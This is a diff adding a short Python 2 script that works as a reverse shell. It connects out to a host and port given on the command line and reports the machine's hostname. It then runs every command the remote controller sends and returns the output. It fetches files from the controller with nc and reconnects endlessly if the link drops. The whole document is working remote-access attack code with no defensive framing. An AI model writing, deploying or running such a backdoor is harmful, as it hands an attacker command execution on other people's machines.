@@ -1,0 +1,72 @@
+#!/usr/bin/python
+
+import socket
+import commands
+import sys
+import subprocess
+
+#host = '127.0.0.1'
+#port = 80
+
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+def connect():
+	#create an INET, STREAMing socket
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	#now connect to the server on port 80
+	# - the normal http port
+	s.connect((host, port))
+
+	#Get Computer name to send to the server
+	hostName = commands.getstatusoutput('hostname')
+	s.send('%s\n' % hostName[1])
+	return s
+
+def runCmd(comm):
+	result = commands.getstatusoutput('%s' % comm)
+	result2 = result[1] + '\n'
+	return result2
+
+soc = connect()
+
+# start loop
+while 1:
+	data = soc.recv(1024)
+
+
+	# check if data recieved = a command then run condition based on that command
+	# Run data as command and store output as variable proc
+	# proc = commands.getstatusoutput('%s' % data[:-1])
+	# proc2 = proc[1] + '\n'
+	comm = data[:-1].split(' ', 1)[0]
+	if comm == 'quit': 
+		break
+	
+	elif comm == 'upload':
+		data2 = data[:-1].split(' ', 2)
+		data2[0] = 'nc %s' % host 
+		data3 = data2[0] + ' %s > ' % data2[2] + data2[1]
+		print data3
+		proc2 = runCmd(data3)
+
+	
+	else:
+		proc2 = runCmd(data[:-1])
+	
+	# Send back the output to the server
+	try:
+		soc.send('%s' % proc2)
+	except:
+		try:
+			soc = connect()
+		except:
+			i = 0
+			while i == 0:
+				try:
+					soc = connect()
+					i = 1
+				except:
+					i = 0
+# close the socket
+soc.close()
